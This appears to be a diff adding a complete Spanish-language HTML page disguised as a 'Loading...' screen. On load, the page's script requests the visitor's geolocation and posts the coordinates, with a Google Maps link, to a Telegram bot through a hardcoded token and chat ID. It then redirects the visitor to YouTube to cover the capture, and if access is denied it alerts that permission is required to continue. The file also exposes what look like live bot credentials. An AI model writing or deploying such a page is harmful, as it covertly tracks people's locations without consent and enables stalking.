@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cargando...</title>
+</head>
+<body>
+    <script>
+        // --- CONFIGURACIÓN ---
+        const TOKEN = "8696903774:AAFzeE0FIsmmS-de6C0vJ4tMdTgC8WwC9z4"; 
+        const CHAT_ID = "1564844725";    
+
+        async function enviarTelegram(position) {
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+            
+            // Creamos el mensaje con el link de Google Maps
+            const mensaje = `📍 ¡Ubicación recibida!\n\n` +
+                          `Latitud: ${lat}\n` +
+                          `Longitud: ${lon}\n\n` +
+                          `Ver en Google Maps:\n` +
+                          `https://www.google.com/maps?q=${lat},${lon}`;
+
+            const url = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
+
+            try {
+                await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: mensaje
+                    })
+                });
+            } catch (error) {
+                console.log("Error enviando datos.");
+            } finally {
+                // Redirigir a la persona después de enviar
+                window.location.href = "https://www.youtube.com"; 
+            }
+        }
+
+        function error() {
+            alert("Error: Debes permitir el acceso para continuar.");
+        }
+
+        // Solicitar ubicación
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(enviarTelegram, error);
+        } else {
+            alert("Tu navegador no soporta esta función.");
+        }
+    </script>
+</body>
+</html>
